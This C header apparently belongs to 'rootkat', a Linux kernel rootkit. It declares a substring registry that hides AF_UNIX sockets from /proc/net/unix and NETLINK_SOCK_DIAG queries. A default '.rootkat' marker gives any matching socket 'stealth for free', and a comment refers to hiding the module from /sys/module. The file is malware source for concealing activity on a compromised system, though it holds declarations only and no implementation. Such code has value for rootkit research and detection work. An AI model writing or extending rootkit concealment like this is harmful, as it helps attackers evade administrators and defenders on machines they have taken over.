/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HIDDEN_UNIX_PATHS_H
#define ROOTKAT_HIDDEN_UNIX_PATHS_H

#include <linux/types.h>

/*
 * Substring registry for hiding AF_UNIX bound paths. Any unix socket
 * whose path contains a registered substring is invisible to
 * /proc/net/unix walkers and to NETLINK_SOCK_DIAG queries against
 * AF_UNIX.
 *
 * Substring (not prefix / not exact) so callers can register short
 * markers and tag socket paths with them anywhere — the design
 * mirrors the filldir64 "rootkat" filter for /sys/module hiding.
 *
 * Initialized with one default entry (".rootkat") at module load so
 * any process that names a socket along the lines of /tmp/.rootkat-foo
 * gets stealth for free.
 */

#define ROOTKAT_HIDDEN_UNIX_PATHS_MAX     8
#define ROOTKAT_HIDDEN_UNIX_PATHS_MAXLEN  32

void rootkat_hidden_unix_paths_init(void);
void rootkat_hide_unix_path(const char *needle);
void rootkat_unhide_unix_path(const char *needle);

/* path may be non-NUL-terminated (sun_path with abstract socket prefix);
 * len bounds the scan. Returns true if any registered substring appears. */
bool rootkat_is_unix_path_hidden(const char *path, unsigned int len);

#endif
